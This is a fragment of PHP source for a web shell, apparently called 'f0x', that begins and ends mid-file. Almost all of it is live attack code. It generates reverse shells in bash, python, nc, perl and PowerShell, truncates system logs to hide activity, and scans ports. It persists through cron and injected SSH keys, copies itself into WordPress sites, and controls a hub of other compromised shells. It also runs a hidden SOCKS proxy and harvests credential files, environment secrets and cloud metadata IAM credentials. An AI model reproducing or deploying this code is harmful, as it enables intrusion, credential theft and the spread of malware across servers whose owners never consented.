            else { $o = @shell_exec('ps aux 2>/dev/null'); $lines = explode("\n", trim($o??'')); $procs = []; foreach($lines as $i=>$l){if($i<1)continue;$p=preg_split('/\s+/',$l,11);if(count($p)>10)$procs[]=['user'=>$p[0],'pid'=>$p[1],'cpu'=>$p[2],'mem'=>$p[3],'cmd'=>substr($p[10],0,80)];} json_exit(['ok'=>true,'procs'=>$procs]); }
        }
        if ($action === 'kill') { $pid = intval($_REQUEST['pid'] ?? 0); if ($pid) { if ($IS_WIN) system("taskkill /F /PID $pid 2>nul", $rc); else system("kill -9 $pid 2>/dev/null", $rc); } json_exit(['ok'=>true]); }
        json_exit(['error'=>'Unknown action']);
    }
    if ($mode === 'users') {
        if ($IS_WIN) { $o = @shell_exec('net user 2>nul'); $lines = explode("\n", trim($o??'')); $users = []; $capture=false; foreach($lines as $l){if(stripos($l,'---')!==false){$capture=true;continue;}if($capture && trim($l)==='')break;if($capture)foreach(preg_split('/\s+/',trim($l)) as $u)if($u)$users[]=$u;} json_exit(['ok'=>true,'users'=>$users]); }
        else { $o = @file_get_contents('/etc/passwd'); $users = []; if($o)foreach(explode("\n",trim($o)) as $l){$p=explode(':',$l);if(count($p)>6&&strpos($p[6],'nologin')===false&&strpos($p[6],'false')===false)$users[]=$p[0];} json_exit(['ok'=>true,'users'=>$users]); }
    }
    if ($mode === 'm') { ob_start(); if ($IS_WIN) system("ipconfig 2>&1",$rc); else system("ifconfig 2>/dev/null || ip a 2>/dev/null",$rc); json_exit(['output'=>ob_get_clean()]); }
    if ($mode === 'health') {
        $uptime = $IS_WIN ? '?' : trim(@shell_exec('uptime 2>/dev/null')?:'?');
        $load = $IS_WIN ? '?' : implode(', ', @sys_getloadavg()?:['?']);
        $mem = $IS_WIN ? '?' : (@file_get_contents('/proc/meminfo') ? preg_match('/MemAvailable:\s+(\d+)/',$m)?$m[1]:'?' : '?');
        json_exit(['ok'=>true, 'uptime'=>$uptime, 'load'=>$load, 'mem_avail'=>$mem, 'user'=>$USER, 'hostname'=>$HOSTNAME, 'os'=>$OS]);
    }

    // File search
    if ($mode === 'file_search') {
        $p = $_REQUEST['p'] ?? $ROOT_DIR; $s = $_REQUEST['s'] ?? ''; $e = strtolower($_REQUEST['e'] ?? '');
        $results = []; $count = 0; $max = 500;
        $it = @new RecursiveIteratorIterator(@new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS));
        if ($it) { foreach ($it as $f) { if ($count >= $max) break; if ($f->getSize() > 10485760) continue; if ($e && pathinfo($f->getPathname(), PATHINFO_EXTENSION) !== $e) continue; $c = @file_get_contents($f->getPathname(), false, null, 0, 1048576); if ($c && strpos($c, $s) !== false) { $results[] = ['path'=>$f->getPathname(),'size'=>$f->getSize(),'lines'=>substr_count($c,"\n")+1]; $count++; } } }
        json_exit(['ok'=>true,'results'=>$results,'total'=>$count]);
    }

    // Rev shell
    if ($mode === 'revshell') {
        $ip = $_REQUEST['ip'] ?? '127.0.0.1'; $port = intval($_REQUEST['port'] ?? 4444);
        $shells = [];
        if ($IS_WIN) {
            $shells['powershell #1'] = '\$client = New-Object System.Net.Sockets.TCPClient("'.$ip.'",'.$port.');\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + "PS " + (pwd).Path + "> ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()';
            $shells['nc.exe'] = 'nc.exe -e cmd.exe '.$ip.' '.$port;
        } else {
            $shells['bash'] = 'bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1';
            $shells['python'] = 'python3 -c "import os,socket,pty;s=socket.socket();s.connect((\''.$ip.'\','.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')"';
            $shells['nc'] = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc '.$ip.' '.$port.' >/tmp/f';
            $shells['php'] = 'php -r \'\$s=fsockopen("'.$ip.'",'.$port.');exec("/bin/bash -i <&3 >&3 2>&3");\'';
            $shells['perl'] = 'perl -e \'use Socket;\$i="'.$ip.'";\$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}\'';
        }
        json_exit(['ok'=>true,'shells'=>$shells]);
    }

    // Log cleaner
    if ($mode === 'log_cleaner') {
        $action = $_REQUEST['action'] ?? 'find';
        if ($action === 'find') {
            $log_dirs = $IS_WIN ? ['C:\\xampp\\apache\\logs','C:\\xampp\\php\\logs','C:\\nginx\\logs'] : ['/var/log'];
            $logs = []; $visited = [];
            foreach ($log_dirs as $d) {
                if (!is_dir($d)) continue;
                $it = @new RecursiveIteratorIterator(@new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS));
                if ($it) { foreach ($it as $f) { if ($f->isFile() && $f->getSize() > 0 && ($f->getExtension() === 'log' || strpos($f->getFilename(), 'access') !== false || strpos($f->getFilename(), 'error') !== false)) { $logs[] = ['path'=>$f->getPathname(),'size'=>$f->getSize(),'size_h'=>human_size($f->getSize()),'modified'=>date('Y-m-d H:i',$f->getMTime())]; } } }
            }
            json_exit(['ok'=>true,'logs'=>$logs]);
        }
        if ($action === 'truncate') {
            $max_size = (int)($_REQUEST['max_size'] ?? 0) * 1048576; $truncated = 0;
            $log_dirs = $IS_WIN ? ['C:\\xampp\\apache\\logs','C:\\xampp\\php\\logs','C:\\nginx\\logs'] : ['/var/log'];
            foreach ($log_dirs as $d) { if (!is_dir($d)) continue;
                $it = @new RecursiveIteratorIterator(@new RecursiveDirectoryIterator($d, RecursiveDirectoryIterator::SKIP_DOTS));
                if ($it) { foreach ($it as $f) { if ($f->isFile() && $f->getSize() > $max_size && ($f->getExtension() === 'log' || strpos($f->getFilename(), 'access') !== false || strpos($f->getFilename(), 'error') !== false)) { @file_put_contents($f->getPathname(), ''); $truncated++; } } }
            }
            json_exit(['ok'=>true,'truncated'=>$truncated]);
        }
        json_exit(['error'=>'Unknown action']);
    }

    // Network
    if ($mode === 'network') {
        $action = $_REQUEST['action'] ?? 'ping'; $host = $_REQUEST['host'] ?? '127.0.0.1';
        $timeout = max(1, min(30, intval($_REQUEST['timeout'] ?? 5)));
        if ($action === 'ping') { ob_start(); if ($IS_WIN) system("ping -n 2 -w {$timeout}000 ".escapeshellarg($host)." 2>&1",$rc); else system("ping -c 2 -W $timeout ".escapeshellarg($host)." 2>&1",$rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        if ($action === 'dns') { ob_start(); if ($IS_WIN) system("nslookup ".escapeshellarg($host)." 2>&1",$rc); else system("host ".escapeshellarg($host)." 2>&1 || nslookup ".escapeshellarg($host)." 2>&1",$rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        if ($action === 'portscan') { $plist = explode(',', $_REQUEST['ports'] ?? '22,80,443,3306,8080'); $results = []; foreach ($plist as $pt) { $pt = trim($pt); $sock = @fsockopen($host, intval($pt), $eno, $err, $timeout); $results[] = ['port'=>intval($pt),'open'=>$sock!==false]; if ($sock) fclose($sock); } json_exit(['ok'=>true,'results'=>$results,'host'=>$host]); }
        if ($action === 'portscan_range') { $start = max(1, intval($_REQUEST['start'] ?? 1)); $end = min(65535, intval($_REQUEST['end'] ?? 1024)); $open = []; for ($p = $start; $p <= $end; $p++) { $sock = @fsockopen($host, $p, $eno, $err, 0.5); if ($sock) { fclose($sock); $open[] = $p; } } json_exit(['ok'=>true,'open_ports'=>$open,'count'=>count($open),'range'=>"$start-$end",'host'=>$host]); }
        if ($action === 'whois') { ob_start(); system("whois ".escapeshellarg($host)." 2>&1 | head -100", $rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        json_exit(['error'=>'Unknown action']);
    }

    // Benchmark
    if ($mode === 'benchmark') {
        $action = $_REQUEST['action'] ?? 'sysinfo';
        if ($action === 'sysinfo') {
            $result = []; $result['hostname'] = $HOSTNAME; $result['ip'] = $_SERVER['SERVER_ADDR'] ?? '?'; $result['os'] = php_uname(); $result['php'] = phpversion(); $result['server'] = $SERVER_SW; $result['user'] = $USER;
            if (!$IS_WIN) { $uptime = @shell_exec('uptime 2>/dev/null'); $result['uptime'] = $uptime ? trim($uptime) : '?'; $load = @sys_getloadavg(); $result['load'] = $load ? implode(', ', $load) : '?'; $result['cpu_cores'] = trim(@shell_exec('nproc 2>/dev/null') ?: '?'); $result['cpu_model'] = trim(@shell_exec('cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -1 | cut -d: -f2') ?: '?'); $mem = @file_get_contents('/proc/meminfo'); if ($mem) { preg_match('/MemTotal:\s+(\d+)/', $mem, $mt); preg_match('/MemAvailable:\s+(\d+)/', $mem, $ma); $result['mem_total'] = isset($mt[1]) ? human_size($mt[1]*1024) : '?'; $result['mem_avail'] = isset($ma[1]) ? human_size($ma[1]*1024) : '?'; } $disk = @disk_free_space('/'); $dt = @disk_total_space('/'); $result['disk_free'] = $disk ? human_size($disk) : '?'; $result['disk_total'] = $dt ? human_size($dt) : '?'; $result['disk_pct'] = $dt ? round(($dt-$disk)/$dt*100) : '?'; }
            json_exit(['ok'=>true] + $result);
        }
        if ($action === 'speed') {
            $t = microtime(true); $s = ''; for ($i=0;$i<100000;$i++) $s .= chr(65+($i%26)); $string_ops = round(100000/(microtime(true)-$t)).' ops/sec';
            $t = microtime(true); $arr = range(1,100000); shuffle($arr); sort($arr); $sort_ops = round(microtime(true)-$t, 4).'s';
            $t = microtime(true); for ($i=0;$i<10000;$i++) md5((string)$i); $md5_ops = round(10000/(microtime(true)-$t)).' ops/sec';
            json_exit(['ok'=>true,'string_ops'=>$string_ops,'sort_100k'=>$sort_ops,'md5_10k'=>$md5_ops]);
        }
    }

    // Cron
    if ($mode === 'cron') {
        $action = $_REQUEST['action'] ?? 'list';
        if ($IS_WIN) json_exit(['ok'=>true,'crons'=>[],'message'=>'Use Task Scheduler']);
        $cron = @shell_exec('crontab -l 2>/dev/null');
        if ($action === 'list') { $lines = $cron ? explode("\n", trim($cron)) : []; $entries = []; foreach ($lines as $l) { if (trim($l) && !str_starts_with(trim($l), '#')) $entries[] = ['line'=>$l]; } json_exit(['ok'=>true,'crons'=>$entries]); }
        if ($action === 'add') { $schedule = $_REQUEST['schedule'] ?? '* * * * *'; $cmd = $_REQUEST['cmd'] ?? ''; if (!$cmd) json_exit(['error'=>'No command']); $new = "$schedule $cmd"; $existing = $cron ? trim($cron)."\n" : ''; @file_put_contents('/tmp/f0x_cron', $existing.$new."\n"); @shell_exec('crontab /tmp/f0x_cron 2>/dev/null'); @unlink('/tmp/f0x_cron'); json_exit(['ok'=>true]); }
        if ($action === 'remove') { $idx = intval($_REQUEST['idx'] ?? -1); if ($idx < 0) json_exit(['error'=>'Invalid index']); $lines = $cron ? explode("\n", trim($cron)) : []; $kept = []; $i=0; foreach ($lines as $l) { if (trim($l) && !str_starts_with(trim($l), '#')) { if ($i !== $idx) $kept[] = $l; $i++; } else $kept[] = $l; } @file_put_contents('/tmp/f0x_cron', implode("\n", $kept)."\n"); @shell_exec('crontab /tmp/f0x_cron 2>/dev/null'); @unlink('/tmp/f0x_cron'); json_exit(['ok'=>true]); }
        json_exit(['error'=>'Unknown action']);
    }

    // Spread (Phase 7 upgrade)
    if ($mode === 'spread') {
        $action = $_REQUEST['action'] ?? 'check';
        $self_b64 = base64_encode(@file_get_contents(__FILE__) ?: '');
        if ($action === 'check') {
            $writable = []; $wp_installs = [];
            foreach ([$ROOT_DIR, ($_SERVER['DOCUMENT_ROOT']??''), '/var/www', '/tmp'] as $d) { if ($d && is_dir($d) && is_writable($d)) $writable[] = $d; if ($d && file_exists(rtrim($d,'\\/').'/wp-config.php')) $wp_installs[] = $d; }
            $ssh_writable = is_writable(($_SERVER['HOME']??'/root').'/.ssh');
            $cron_ok = !$IS_WIN && is_executable('/usr/bin/crontab');
            json_exit(['ok'=>true, 'self_size'=>strlen(base64_decode($self_b64)), 'writable_dirs'=>$writable, 'wp_installs'=>$wp_installs, 'ssh_writable'=>$ssh_writable, 'cron_ok'=>$cron_ok]);
        }
        if ($action === 'deploy') {
            $targets = explode("\n", trim($_REQUEST['targets']??'')); $payload = base64_decode($self_b64); $results = [];
            foreach ($targets as $t) { $t = trim($t); if (!$t) continue;
                if (is_dir($t) && is_writable($t)) { $dest = rtrim($t,'\\/').'/'.basename(__FILE__); @file_put_contents($dest, $payload) ? $results[] = ['target'=>$dest,'status'=>'deployed'] : $results[] = ['target'=>$t,'status'=>'write_failed']; }
                else { $results[] = ['target'=>$t,'status'=>'invalid']; }
            }
            json_exit(['ok'=>true,'results'=>$results]);
        }
        if ($action === 'wp_infect') {
            $payload = base64_decode($self_b64); $infect_name = $_REQUEST['payload_name']??'.wp.php'; $results = [];
            foreach ([$ROOT_DIR, ($_SERVER['DOCUMENT_ROOT']??''), '/var/www'] as $d) { if (!$d || !is_dir($d)) continue;
                foreach ([rtrim($d,'\\/')] + (@glob(rtrim($d,'\\/').'/*', GLOB_ONLYDIR)?:[]) as $sd) { if (file_exists(rtrim($sd,'\\/').'/wp-config.php')) { $dest = rtrim($sd,'\\/').'/'.$infect_name; if (@file_put_contents($dest, $payload)) $results[] = ['dir'=>$sd,'status'=>'infected']; } }
            }
            json_exit(['ok'=>true,'results'=>$results]);
        }
        if ($action === 'ssh_key') {
            $pubkey = $_POST['pubkey'] ?? ''; if (!$pubkey) json_exit(['error'=>'No key']);
            $dir = ($_SERVER['HOME']??'/root').'/.ssh'; if (!is_dir($dir)) @mkdir($dir,0700,true);
            $ak = $dir.'/authorized_keys'; $existing = @file_get_contents($ak)?:'';
            if (strpos($existing, trim($pubkey)) !== false) json_exit(['ok'=>true,'status'=>'already_present']);
            if (@file_put_contents($ak, $existing."\n".trim($pubkey)."\n")) { @chmod($ak,0600); json_exit(['ok'=>true,'status'=>'key_added']); }
            json_exit(['error'=>'Write failed']);
        }
        json_exit(['error'=>'Unknown spread action']);
    }

    // Hub (Phase 7 upgrade)
    if ($mode === 'hub') {
        $action = $_REQUEST['action'] ?? 'list';
        $hub_file = __DIR__ . '/.f0x_hub.json';
        if ($action === 'list') { $shells = []; if (file_exists($hub_file)) { $c = @file_get_contents($hub_file); if ($c) $shells = json_decode($c, true) ?: []; } json_exit(['ok'=>true,'shells'=>$shells]); }
        if ($action === 'add' || $action === 'save') { $url = $_POST['url'] ?? ''; $label = $_POST['label'] ?? $_POST['name'] ?? ''; $key = $_POST['key'] ?? ''; if (!$url) json_exit(['error'=>'No URL']); $shells = []; if (file_exists($hub_file)) { $c = @file_get_contents($hub_file); if ($c) $shells = json_decode($c, true) ?: []; } $shells[] = ['url'=>$url,'label'=>$label?:$url,'key'=>$key,'added'=>time()]; @file_put_contents($hub_file, json_encode($shells)); json_exit(['ok'=>true]); }
        if ($action === 'remove' || $action === 'delete') { $idx = intval($_POST['idx'] ?? -1); if ($idx < 0) json_exit(['error'=>'Invalid']); $shells = []; if (file_exists($hub_file)) { $c = @file_get_contents($hub_file); if ($c) $shells = json_decode($c, true) ?: []; } if (isset($shells[$idx])) array_splice($shells, $idx, 1); @file_put_contents($hub_file, json_encode($shells)); json_exit(['ok'=>true]); }
        if ($action === 'probe') {
            $url = $_POST['url'] ?? ''; $key = $_POST['key'] ?? $tkey ?? ''; if (!$url && ($_POST['target']??'')) $url = $_POST['target']; if (!$url) json_exit(['error'=>'No URL']);
            $sep = strpos($url, '?') === false ? '?' : '&';
            $resp = @file_get_contents($url . $sep . 'm=ping&ajax=1&k=' . urlencode($key), false, stream_context_create(['http'=>['timeout'=>5, 'method'=>'GET']]));
            $d = $resp ? @json_decode($resp, true) : null; json_exit(['ok'=>!!$d, 'alive'=>!!$d, 'hostname'=>$d['hostname']??'?', 'user'=>$d['user']??'?', 'response'=>$d]);
        }
        if ($action === 'broadcast') {
            $cmd = $_POST['cmd'] ?? ''; $targets = json_decode($_POST['shells'] ?? '[]', true) ?: [];
            if (!$cmd) json_exit(['error'=>'No command']); if (empty($targets)) json_exit(['error'=>'No targets']);
            $results = [];
            foreach ($targets as $t) { $u = $t['url'] ?? ''; $k = $t['key'] ?? ''; if (!$u) continue;
                $sep = strpos($u, '?') === false ? '?' : '&';
                $resp = @file_get_contents($u . $sep . 'mode=cmd&c=' . urlencode($cmd) . '&ajax=1&k=' . urlencode($k), false, stream_context_create(['http'=>['timeout'=>10]]));
                $results[] = ['url'=>$u, 'ok'=>!empty($resp), 'response'=> $resp ? (substr(@json_decode($resp,true)['output']??'',0,200)) : 'timeout'];
            }
            json_exit(['ok'=>true, 'results'=>$results]);
        }
        if ($action === 'batch_probe') {
            $targets = json_decode($_POST['shells'] ?? '[]', true) ?: []; $results = [];
            foreach ($targets as $t) { $u = $t['url'] ?? ''; $k = $t['key'] ?? ''; if (!$u) continue;
                $sep = strpos($u, '?') === false ? '?' : '&'; $start = microtime(true);
                $resp = @file_get_contents($u . $sep . 'm=ping&ajax=1&k=' . urlencode($k), false, stream_context_create(['http'=>['timeout'=>5]]));
                $d = $resp ? @json_decode($resp, true) : null;
                $results[] = ['url'=>$u, 'name'=>$t['label']??$u, 'alive'=>!empty($d['ok']), 'latency_ms'=>round((microtime(true)-$start)*1000), 'hostname'=>$d['hostname']??'?'];
            }
            json_exit(['ok'=>true, 'results'=>$results]);
        }
        json_exit(['error'=>'Unknown hub action']);
    }

    // Phase 5: Proxy
    if ($mode === 'proxy') {
        $action = $_REQUEST['action'] ?? '';
        if ($action === 'fetch') {
            $url = $_REQUEST['url'] ?? ''; $method = strtoupper($_REQUEST['method']??'GET'); $headers = isset($_REQUEST['headers'])?@json_decode($_REQUEST['headers'],true):[]; $body_raw = $_REQUEST['body']??''; $timeout = (int)($_REQUEST['timeout']??15);
            if (!$url) json_exit(['error'=>'No URL']); $ch = @curl_init(); if (!$ch) json_exit(['error'=>'cURL not available']);
            @curl_setopt($ch, CURLOPT_URL, $url); @curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); @curl_setopt($ch, CURLOPT_HEADER, true); @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); @curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            $curl_headers = []; foreach ($headers as $k=>$v) $curl_headers[] = "$k: $v"; if (!empty($curl_headers)) @curl_setopt($ch, CURLOPT_HTTPHEADER, $curl_headers);
            if (in_array($method, ['POST','PUT','PATCH','DELETE']) && $body_raw !== '') @curl_setopt($ch, CURLOPT_POSTFIELDS, $body_raw);
            $response = @curl_exec($ch); $http_code = @curl_getinfo($ch, CURLINFO_HTTP_CODE); $header_size = @curl_getinfo($ch, CURLINFO_HEADER_SIZE); $error = @curl_error($ch); $info = @curl_getinfo($ch); @curl_close($ch);
            if ($response === false) json_exit(['error'=>"cURL error: $error"]);
            $response_headers = substr($response,0,$header_size); $response_body = substr($response,$header_size);
            if (strlen($response_body) > 2097152) $response_body = substr($response_body,0,2097152)."\n[... TRUNCATED 2MB ...]";
            json_exit(['ok'=>true,'http_code'=>$http_code,'headers'=>$response_headers,'body'=>base64_encode($response_body),'content_type'=>$info['content_type']??'','total_time'=>round($info['total_time']??0,3),'primary_ip'=>$info['primary_ip']??'','primary_port'=>$info['primary_port']??0,'size'=>strlen($response_body)]);
        }
        if ($action === 'scan') {
            $host = $_REQUEST['host']??''; $ports = $_REQUEST['ports']??'22,80,443,8080,3306,5432,6379,8443,9090,27017'; $timeout = (int)($_REQUEST['timeout']??2);
            if (!$host) json_exit(['error'=>'No host']); $results = []; $open_count = 0;
            foreach (explode(',',$ports) as $p) { $port = (int)trim($p); if ($port<=0||$port>65535) continue; $sock = @fsockopen($host,$port,$eno,$err,$timeout); if ($sock) { @fclose($sock); $results[] = ['port'=>$port,'status'=>'open','service'=>@getservbyport($port)?:'']; $open_count++; } else $results[] = ['port'=>$port,'status'=>'closed']; }
            json_exit(['ok'=>true,'host'=>$host,'total'=>count($results),'open'=>$open_count,'results'=>$results]);
        }
        if ($action === 'socks_start') {
            $port = (int)($_REQUEST['port']??1080); if ($port<1024||$port>65535) json_exit(['error'=>'Port 1024-65535']);
            $proxy_id = 'proxy_'.substr(md5(__FILE__.$port),0,8); $pid_file = sys_get_temp_dir()."/.f0x_{$proxy_id}.pid";
            $old_pid = (int)@file_get_contents($pid_file); $running = false;
            if ($old_pid>0) { if ($IS_WIN) { @exec("tasklist /FI \"PID eq $old_pid\" 2>nul",$o,$c); $running = $c===0 && strpos(implode(' ',$o),(string)$old_pid)!==false; } else { @exec("kill -0 $old_pid 2>/dev/null",$o,$c); $running = $c===0; } }
            if ($running) json_exit(['ok'=>true,'pid'=>$old_pid,'port'=>$port,'status'=>'already_running']);
            $python = ''; foreach (['python3','python'] as $bin) { if ($IS_WIN) @exec("where $bin 2>nul",$o,$c); else @exec("which $bin 2>/dev/null",$o,$c); if ($c===0&&!empty($o[0])){$python=$o[0];break;} }
            if (!$python) { foreach (glob('C:\\Python3*\\python.exe')?:[] as $p) { $python=$p; break; } }
            if (!$python) json_exit(['error'=>'Python not found. Use HTTP relay.']);
            $socks_script = str_replace('PORT_PLACEHOLDER', $port, 'import socket,socketserver,threading,sys,os,struct;BIND_HOST="0.0.0.0";BIND_PORT=PORT_PLACEHOLDER
class H(socketserver.StreamRequestHandler):
 def handle(self):
  try:
   v=self.rfile.read(2);n=self.rfile.read(ord(v[1:2]));self.wfile.write(bytes([5,0]))
   v,c,r,a=self.rfile.read(4)
   if a==1:addr=socket.inet_ntoa(self.rfile.read(4))
   elif a==3:al=self.rfile.read(1)[0];addr=self.rfile.read(al).decode()
   elif a==4:addr=socket.inet_ntop(socket.AF_INET6,self.rfile.read(16))
   else:return
   p=int.from_bytes(self.rfile.read(2),"big")
   if c==1:
    try:
     rem=socket.socket();rem.settimeout(30);rem.connect((addr,p))
     self.wfile.write(bytes([5,0,0,1,0,0,0,0,0,0]))
     def pipe(s,d):
      while True:
       try:dat=s.recv(65536);d.sendall(dat)
       except:break
      for x in(s,d):
       try:x.close()
       except:pass
     t1=threading.Thread(target=pipe,args=(self.request,rem));t2=threading.Thread(target=pipe,args=(rem,self.request))
     t1.start();t2.start();t1.join();t2.join()
    except:self.wfile.write(bytes([5,1,0,1,0,0,0,0,0,0]))
  except:pass
class S(socketserver.ThreadingMixIn,socketserver.TCPServer):allow_reuse_address=True;daemon_threads=True
s=S((BIND_HOST,BIND_PORT),H);s.serve_forever()');
            $script_path = sys_get_temp_dir()."/.f0x_{$proxy_id}.py"; @file_put_contents($script_path, $socks_script);
            if ($IS_WIN) {
                $vbs_path = sys_get_temp_dir()."/.f0x_{$proxy_id}.vbs";
                @file_put_contents($vbs_path, 'CreateObject("WScript.Shell").Run "'.$python.' '.$script_path.'",0,False');
                @exec("start /b cscript //nologo \"$vbs_path\" 2>nul");
            } else { @exec("nohup \"$python\" \"$script_path\" >/dev/null 2>&1 & echo $!",$out,$rc); if(!empty($out[0])) @file_put_contents($pid_file,(int)$out[0]); }
            $new_pid = (int)@file_get_contents($pid_file); json_exit(['ok'=>true,'pid'=>$new_pid,'port'=>$port,'status'=>($new_pid>0?'started':'start_failed')]);
        }
        if ($action === 'socks_stop') {
            $port = (int)($_REQUEST['port']??1080); $proxy_id = 'proxy_'.substr(md5(__FILE__.$port),0,8); $pid_file = sys_get_temp_dir()."/.f0x_{$proxy_id}.pid";
            $pid = (int)@file_get_contents($pid_file); if ($pid>0) { if ($IS_WIN) @exec("taskkill /PID $pid /F 2>nul"); else @exec("kill -9 $pid 2>/dev/null"); }
            foreach (['py','vbs','pid'] as $ex) @unlink(sys_get_temp_dir()."/.f0x_{$proxy_id}.$ex");
            json_exit(['ok'=>true,'status'=>'stopped']);
        }
        if ($action === 'socks_status') {
            $port = (int)($_REQUEST['port']??1080); $proxy_id = 'proxy_'.substr(md5(__FILE__.$port),0,8); $pid_file = sys_get_temp_dir()."/.f0x_{$proxy_id}.pid";
            $pid = (int)@file_get_contents($pid_file); $running = false;
            if ($pid>0) { if ($IS_WIN) { @exec("tasklist /FI \"PID eq $pid\" 2>nul",$o,$c); $running = $c===0 && strpos(implode(' ',$o),(string)$pid)!==false; } else { @exec("kill -0 $pid 2>/dev/null",$o,$c); $running = $c===0; } }
            json_exit(['ok'=>true,'running'=>$running,'pid'=>$running?$pid:null,'port'=>$port,'server_ip'=>$_SERVER['SERVER_ADDR']??'?','hostname'=>$HOSTNAME]);
        }
        json_exit(['error'=>'Unknown proxy action']);
    }

    // Phase 6: Harvest
    if ($mode === 'harvest') {
        $action = $_REQUEST['action'] ?? '';
        if ($action === 'scan') {
            $results = []; $hunt = ['wp-config.php','wp-config-sample.php','.env','config.php','config.inc.php','database.php','database.yml','settings.php','conn.php','db.php','global.php','.my.cnf','.pgpass','.netrc','.s3cfg','composer.json','auth.json','.git-credentials','.aws/credentials','.aws/config','.azure/config','id_rsa','id_dsa','id_ecdsa','id_ed25519'];
            $dirs = [$ROOT_DIR, ($_SERVER['DOCUMENT_ROOT']??'')]; foreach (['/var/www','/home','/root','/etc','/opt','/srv'] as $d) if (is_dir($d)) $dirs[] = $d;
            $patterns = ['*pass*','*secret*','*cred*','*token*','*key*','*auth*','*admin*','*config*','*db*','*.sql'];
            $visited = [];
            foreach ($dirs as $dir) { if (!$dir||!is_dir($dir)||isset($visited[$dir])) continue; $visited[$dir]=true;
                foreach ($hunt as $f) { $full=rtrim($dir,'\\/').'/'.$f; if (file_exists($full)&&is_readable($full)) $results[]=['path'=>$full,'name'=>$f,'size'=>filesize($full),'type'=>'config','ext'=>pathinfo($f,PATHINFO_EXTENSION)]; }
                foreach ($patterns as $pat) { $m=@glob(rtrim($dir,'\\/').'/'.$pat); if ($m) foreach ($m as $mm) if (is_file($mm)&&is_readable($mm)&&!isset($visited[$mm])) { $visited[$mm]=true; $results[]=['path'=>$mm,'name'=>basename($mm),'size'=>filesize($mm),'type'=>'pattern','ext'=>pathinfo($mm,PATHINFO_EXTENSION)]; } }
                $subs=@glob(rtrim($dir,'\\/').'/*',GLOB_ONLYDIR); if ($subs) foreach ($subs as $sd) { $visited[$sd]=true; foreach ($hunt as $f) { $full=rtrim($sd,'\\/').'/'.$f; if (file_exists($full)&&is_readable($full)) $results[]=['path'=>$full,'name'=>$f,'size'=>filesize($full),'type'=>'config','ext'=>pathinfo($f,PATHINFO_EXTENSION)]; } }
            }
            $seen=[];$unique=[];foreach($results as $r){if(!isset($seen[$r['path']])){$seen[$r['path']]=true;$unique[]=$r;}}
            json_exit(['ok'=>true,'count'=>count($unique),'files'=>$unique]);
        }
        if ($action === 'grab') {
            $file = $_REQUEST['file']??''; if (!$file||!file_exists($file)||!is_readable($file)) json_exit(['error'=>'File not found']);
            $size = filesize($file); if ($size > 512000) json_exit(['error'=>'File too large']);
            if (in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),['png','jpg','gif','zip','gz','tar','phar','so','dll','exe','bin'])) json_exit(['error'=>'Binary file']);
            $content = @file_get_contents($file); json_exit(['ok'=>true,'path'=>$file,'name'=>basename($file),'size'=>$size,'content'=>base64_encode($content)]);
        }
        if ($action === 'env') {
            $vars = []; foreach ($_ENV as $k=>$v) $vars[] = ['key'=>$k,'value'=>substr((string)$v,0,500)];
            $all = getenv(); if (is_array($all)) foreach ($all as $k=>$v) { $found=false; foreach($vars as $vv) if($vv['key']===$k){$found=true;break;} if(!$found) $vars[]=['key'=>$k,'value'=>substr((string)$v,0,500)]; }
            foreach (['DB_HOST','DB_NAME','DB_USER','DB_PASSWORD','DATABASE_URL','APP_KEY','APP_SECRET','JWT_SECRET','API_KEY','AWS_KEY','AWS_SECRET','AZURE_KEY','GCP_KEY'] as $sk) { $v=$_SERVER[$sk]??getenv($sk); if($v){ $found=false; foreach($vars as $vv) if($vv['key']===$sk){$found=true;break;} if(!$found) $vars[]=['key'=>$sk,'value'=>substr((string)$v,0,500)]; } }
            json_exit(['ok'=>true,'count'=>count($vars),'vars'=>$vars]);
        }
        if ($action === 'cloud_meta') {
            $results = [];
            foreach (['http://169.254.169.254/latest/meta-data/','http://169.254.169.254/latest/meta-data/iam/security-credentials/','http://169.254.169.254/latest/user-data/'] as $ep) {
                $r = @file_get_contents($ep,false,stream_context_create(['http'=>['timeout'=>3]])); $results[] = ['endpoint'=>$ep,'accessible'=>!empty($r),'data'=>$r?substr($r,0,1000):null];
            }
            $gcp = @file_get_contents('http://metadata.google.internal/computeMetadata/v1/',false,stream_context_create(['http'=>['timeout'=>3,'header'=>"Metadata-Flavor: Google\r\n"]])); $results[] = ['endpoint'=>'GCP','accessible'=>!empty($gcp),'data'=>$gcp?substr($gcp,0,500):null];
            $azure = @file_get_contents('http://169.254.169.254/metadata/instance?api-version=2021-02-01',false,stream_context_create(['http'=>['timeout'=>3,'header'=>"Metadata: true\r\n"]])); $results[] = ['endpoint'=>'Azure','accessible'=>!empty($azure),'data'=>$azure?substr($azure,0,500):null];
